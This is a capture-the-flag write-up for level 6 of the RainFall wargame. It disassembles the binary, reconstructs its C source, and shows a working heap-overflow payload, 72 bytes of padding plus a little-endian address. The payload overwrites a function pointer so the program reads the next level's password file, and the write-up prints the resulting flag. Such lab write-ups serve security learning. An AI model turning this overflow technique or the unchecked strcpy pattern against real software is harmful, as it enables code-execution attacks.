# Level 6 — Writeup: Heap Overflow (Function Pointer Overwrite)

## Vulnerability Analysis

By examining the assembly of `level6`, we discover three functions: `main`, `m`, and `n`.
```assembly
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f4  _init
0x08048340  strcpy
0x08048340  strcpy@plt
0x08048350  malloc
0x08048350  malloc@plt
0x08048360  puts
0x08048360  puts@plt
0x08048370  system
0x08048370  system@plt
0x08048380  __gmon_start__
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main
0x08048390  __libc_start_main@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x08048454  n
0x08048468  m
0x0804847c  main
0x080484e0  __libc_csu_init
0x08048550  __libc_csu_fini
0x08048552  __i686.get_pc_thunk.bx
0x08048560  __do_global_ctors_aux
0x0804858c  _fini
(gdb) disass main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp
   0x08048485 <+9>:     movl   $0x40,(%esp)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
   0x08048495 <+25>:    movl   $0x4,(%esp)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
   0x080484d2 <+86>:    leave  
   0x080484d3 <+87>:    ret    
End of assembler dump.
(gdb) disass m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave  
   0x0804847b <+19>:    ret    
End of assembler dump.
(gdb) disass n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave  
   0x08048467 <+19>:    ret    
End of assembler dump.
```

* **`m()`**: Prints "Nope" and exits.
* **`n()`**: Executes `system("/bin/cat /home/user/level7/.pass")`. This is our target function. Its address is `0x08048454`.

### The Logic of `main`

The `main` function performs the following operations:

1. Allocates 64 bytes (`0x40`) on the heap using `malloc`. Let's call this `buf1`.
2. Allocates 4 bytes on the heap using `malloc`. Let's call this `func_ptr`.
3. Assigns the address of function `m` (`0x08048468`) to the memory allocated for `func_ptr`.
4. Uses `strcpy` to copy the user's input (`argv[1]`) into `buf1`.
5. Calls the function pointed to by `func_ptr`.

```c
// Reconstructed C Source Code
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void n() {
    system("/bin/cat /home/user/level7/.pass");
}

void m() {
    puts("Nope");
}

int main(int argc, char **argv) {
    char *buf1 = malloc(64);
    void (**func_ptr)() = malloc(4);
    
    *func_ptr = m; // Set the pointer to function m()
    
    // VULNERABILITY: strcpy has no bounds checking.
    // argv[1] can be larger than the 64 bytes allocated for buf1.
    strcpy(buf1, argv[1]); 
    
    // Execute whatever function func_ptr is pointing to
    (*func_ptr)(); 
    
    return 0;
}

```

## The "Why": How a Heap Overflow mimics a Stack Overflow

In a standard Stack overflow, we overwrite the *Saved Return Address* at the bottom of the stack frame.
In this **Heap overflow**, we are overwriting a **Function Pointer** that sits adjacent to your buffer in heap memory.

When `malloc` allocates memory sequentially, the chunks sit next to each other.

1. `buf1` gets a 64-byte chunk.
2. `func_ptr` gets the very next chunk.

Because `strcpy(buf1, argv[1])` has no size limits, writing past the 64 bytes of `buf1` spills directly into the `func_ptr` chunk. By replacing the address of `m()` with the address of `n()`, the program blindly calls `n()` when it reaches the end of `main`.

## Exploitation Steps

### 1. Find the Target Address

We want to execute `n()`. Using GDB, we find its address:
`0x08048454` (Little Endian: `\x54\x84\x04\x08`).

### 2. Find the Offset

We need to know exactly how many bytes to write before we hit the `func_ptr`. Although `buf1` is 64 bytes, heap memory management (chunk headers, alignment) usually adds a few extra bytes.

We test with GDB:

```txt
(gdb) run $(python2 -c "print 'a'*75+'\x54\x84\x04\x08'")
Program received signal SIGSEGV, Segmentation fault.
0x54616161 in ?? ()

```

The CPU tried to execute `0x54616161` (`Taia`). This means our address was misaligned. We reduce the padding to 72 bytes:

```txt
(gdb) run $(python2 -c "print 'a'*72+'\x54\x84\x04\x08'")
/bin/cat: /home/user/level7/.pass: Permission denied
[Inferior 1 (process 5106) exited normally]

```

The program successfully executed `n()` (the permission denied error is expected inside GDB as privileges are dropped). **The offset is exactly 72 bytes.**

### 3. Execution

We run the exploit outside of GDB to extract the flag. Because the payload is passed as an argument (`argv[1]`), we use command substitution directly without needing a pipe.

```bash
level6@RainFall:~$ ./level6 $(python2 -c "print 'a'*72+'\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

```

**Conclusion:** By overflowing a heap buffer into an adjacent function pointer, we successfully hijacked the execution flow to call an unreferenced function and read the flag.